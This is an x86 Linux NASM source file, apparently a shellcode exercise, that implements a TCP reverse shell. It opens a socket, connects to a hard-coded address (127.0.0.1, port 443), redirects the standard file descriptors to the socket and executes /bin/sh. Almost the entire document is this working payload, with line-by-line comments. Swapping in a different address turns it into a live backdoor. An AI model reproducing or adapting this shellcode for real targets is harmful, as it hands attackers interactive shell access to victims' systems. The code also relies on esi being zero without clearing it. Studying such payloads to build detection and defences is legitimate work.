; Filename: revshell.nasm
; Author: lastlistener
; Purpose: Demonstrate TCP reverse shell shellcode.

global _start			

section .text
_start:
	; eax = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
	push byte 0x66		
	pop eax                 ; eax = syscall number for SOCKETCALL
	xor edx,edx             ; edx = 0
	push edx                ; stack = [protocol 0]
	inc edx                 ; edx = 1
	mov ebx,edx             ; ebx = socketcall #1 (socket)
	push edx                ; stack = [protocol 0, sock_stream 1]
	inc edx                 ; edx = 2
	push edx                ; stack = [protocol 0, sock_stream 1, AF_INET 2]
	mov ecx,esp             ; ecx = pointer to params
	int 0x80                ; socket()
	
	mov edx,eax             ; save socket in edx

	; connect(socket, sockaddr*, sizeof(socket))
	push dword 0x0100007f   ; stack = [ip with byte significance reversed], this is 127.0.0.1
	push dword 0xbb010002   ; stack = complete sockaddr struct: [ip, port, family AF_INET]
	mov ecx, esp            ; save address of sockaddr struct in ecx
	push byte 0x66
	pop eax	                ; eax = SOCKETCALL
	push byte 0x10          ; length of sockaddr struct
	push ecx                ; address of sockaddr struct
	push edx                ; socket
	mov ecx,esp             ; ecx = pointer to args
	push byte 0x3
	pop ebx                 ; ebx = socketcall #3 (connect)
	int 0x80                ; connect()

	; dup2(socket, std_descriptor)
	xor ecx,ecx
	mov cl,0x2              ; loop on stderr/out/in, file descriptors 2, 1, 0
loop_fds:
	push byte 0x3f
	pop eax                 ; eax = syscall dup2 (0x3f)
	mov ebx,edx             ; oldfd = socket
	int 0x80                ; dup2()
	dec ecx                 ; change to next std file descriptor
	jns loop_fds            ; if the DEC does not produce a negative we have not cloned 2, 1 and 0
	
	; execve(filename, argv, env)
	push esi
	push dword 0x68732f2f   ; hs//
	push dword 0x6e69622f   ; nib/
	mov ebx,esp             ; filename = /bin/sh
	mov al,11               ; syscall number
	mov ecx,esi             ; no argv needed
	mov edx,esi             ; no env needed
	int 0x80


